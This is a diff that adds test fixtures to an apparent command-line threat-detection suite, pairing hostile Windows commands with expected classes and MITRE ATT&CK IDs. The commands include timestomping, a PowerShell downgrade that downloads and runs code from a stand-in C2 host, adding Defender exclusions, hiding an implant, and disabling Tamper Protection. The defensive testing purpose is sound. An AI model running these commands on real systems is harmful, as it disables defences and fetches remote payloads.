@@ -42,5 +42,65 @@
       "techniques": ["T1548.002"]
     },
     "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "timestomp-io-file",
+    "description": "PowerShell timestamp manipulation via [IO.File]::SetLastWriteTime — anti-forensic timeline evasion",
+    "source": "MITRE ATT&CK T1070.006 ; Mandiant M-Trends 2022",
+    "command": "powershell -c \"[IO.File]::SetLastWriteTime('C:\\Windows\\Temp\\malware.exe', '01/01/2020 12:00:00'); [IO.File]::SetCreationTime('C:\\Windows\\Temp\\malware.exe', '01/01/2020 12:00:00')\"",
+    "expect": {
+      "classes": ["defense_evasion"],
+      "min_confidence": {"defense_evasion": "medium"},
+      "techniques": ["T1070.006"]
+    },
+    "reject": {"classes": ["impact", "credential_theft", "dropper"]}
+  },
+  {
+    "id": "ps-downgrade-v2",
+    "description": "PowerShell version 2 downgrade attack — escapes ScriptBlock logging and AMSI introduced in v3+",
+    "source": "MITRE ATT&CK T1548.002 ; S0194 PowerSploit documentation",
+    "command": "powershell -Version 2 -NoProfile -ExecutionPolicy bypass -Command \"IEX((New-Object Net.WebClient).DownloadString('hxxp://c2[.]xyz/a'))\"",
+    "expect": {
+      "classes": ["defense_evasion", "loader", "dropper"],
+      "min_confidence": {"defense_evasion": "medium", "loader": "high", "dropper": "high"},
+      "techniques": ["T1548.002", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "add-mppreference-exclusion",
+    "description": "Adds Windows Defender path exclusion to allow malware to run undetected",
+    "source": "MITRE ATT&CK T1562.001 ; CISA AA22-321A",
+    "command": "powershell Add-MpPreference -ExclusionPath C:\\Windows\\Temp -ExclusionExtension .exe",
+    "expect": {
+      "classes": ["defense_evasion"],
+      "min_confidence": {"defense_evasion": "high"},
+      "techniques": ["T1562.001"]
+    },
+    "reject": {"classes": ["impact", "dropper", "credential_theft"]}
+  },
+  {
+    "id": "attrib-hidden-file",
+    "description": "Sets hidden (+h) and system (+s) attributes on a dropped file to avoid casual discovery",
+    "source": "MITRE ATT&CK T1564.001",
+    "command": "attrib +h +s C:\\Windows\\Temp\\implant.exe",
+    "expect": {
+      "classes": ["defense_evasion"],
+      "min_confidence": {"defense_evasion": "low"},
+      "techniques": ["T1564.001"]
+    },
+    "reject": {"classes": ["impact", "dropper", "credential_theft", "loader"]}
+  },
+  {
+    "id": "tamper-protection-disable",
+    "description": "Disables Windows Defender Tamper Protection via registry — allows further AV configuration changes",
+    "source": "MITRE ATT&CK T1562.001 ; CISA advisory AA23-261A",
+    "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f",
+    "expect": {
+      "classes": ["defense_evasion"],
+      "min_confidence": {"defense_evasion": "high"},
+      "techniques": ["T1562.001"]
+    },
+    "reject": {"classes": ["impact", "dropper", "credential_theft"]}
   }
 ]
